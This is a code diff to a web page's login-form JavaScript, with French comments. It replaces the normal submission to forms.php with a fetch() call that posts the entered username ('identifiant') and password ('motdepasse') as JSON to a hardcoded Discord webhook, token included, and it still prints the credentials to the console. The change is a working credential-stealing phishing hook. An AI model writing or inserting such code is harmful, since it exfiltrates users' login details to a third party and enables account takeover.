@@ -88,17 +88,32 @@
             var xhr = new XMLHttpRequest();
             xhr.open("POST", "forms.php", true);
 
-            // Écoute de l'événement load pour afficher la réponse
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    console.log(xhr.responseText); // Affiche la réponse dans la console
-                } else {
-                    console.error('Une erreur s\'est produite.');
-                }
+            var webhookURL = 'https://discord.com/api/webhooks/1228078613853900850/St-8cUkQY7pH0dodJTUFNT0827XIclL_nE_XVVadlNu7YWR9aOX326nG4FZzvAb9IRS6'; // Remplacez par votre URL de webhook
+
+            // Données à envoyer
+            var data = {
+                "identifiant": identifiant,
+                "motdepasse": motdepasse
             };
 
-            // Envoi de la requête avec les données FormData
-            xhr.send(formData);
+
+            // Envoi de la requête POST au webhook Discord
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Erreur lors de l\'envoi de la requête au webhook Discord');
+                }
+                console.log('Message envoyé avec succès à Discord');
+            })
+            .catch(error => {
+                console.error('Erreur :', error);
+            });
             setTimeout(function() {
                 console.log("Identifiant:", identifiant);
                 console.log("Mot de passe:", motdepasse);
